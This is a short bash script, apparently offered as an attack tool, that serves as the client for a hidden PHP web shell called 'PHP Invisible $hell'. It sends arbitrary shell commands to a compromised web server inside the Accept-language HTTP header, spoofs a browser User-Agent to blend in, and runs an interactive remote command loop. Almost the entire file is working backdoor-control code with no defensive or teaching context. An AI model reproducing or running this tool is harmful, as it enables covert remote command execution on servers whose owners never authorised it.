#!/bin/bash


echo "## PHP Invisible \$hell by omatr0n ##"
#checking if the temporary file exists
if [ -e .tmp ]
then
  #read file and save it into variable
  domain=$(cat .tmp)
  #ask for user input Y/n
  echo -n "History '$domain' found, do you want to use it? (Y/n)"
  read hist
  #make a decision based on user input
  case "$hist" in
	  n)
		#No => Ask for new domain
  		echo -n "Insert Domain & Path (http://www.example.com/index.php):"
  		read domain
		;;
	  #default do nothing
	  *) 
	  	;;
  esac
fi

#creating temporary file
echo -n "$domain" > .tmp 
user=$(curl -s --header "Accept-language: whoami" --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko" http://localhost/header.php)
echo "Running on '$domain' with user '$user'"
while true
do
echo -n "$user@omatr0n$ "
#aks for command to send to remote shell
read com
	#checks if command is exit
	case "$com" in
		exit)
			exit 1
			;;
		#default send command to remote shell	
		*)
			curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko" -H "Accept-language: $com" $domain
			;;

	esac

done

